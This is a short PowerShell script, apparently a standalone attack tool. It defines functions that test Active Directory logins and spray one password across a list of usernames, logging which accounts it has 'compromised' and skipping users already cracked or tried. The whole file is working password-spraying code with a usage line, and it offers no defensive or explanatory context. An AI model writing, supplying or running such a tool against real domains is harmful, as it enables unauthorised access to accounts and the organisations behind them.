Function adcheck {
  param($u,$p)
  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
}
 
Function adlogin {
  param($userlist,$domain,$pwd)

  if (!$pwd) {
    Write-Host "usage: adlogin <userlist.txt> <domain> <password>"
    Write-Host " e.g.: adlogin users.txt domain.com P@ssw0rd`n"
    return
  }
  $results = ".\adlogin.$pwd.txt"

  foreach($line in gc $userlist) {
    $x = (gc $results -EA SilentlyContinue | sls "^$line,.*,True$")
    if ($x) {
      Write-Host "user $line already compromised"
      continue
    }
    $x = (gc $results | sls -CaseSensitive "^$line,$pwd,")
    if ($x) {
      Write-Host "user $line with $pwd already tried"
      continue
    }
    $output = "$line,$pwd,"
    $output += adcheck "$domain\$line" "$pwd"
    Write-Host "$output"
    echo $output >>$results
  }
}
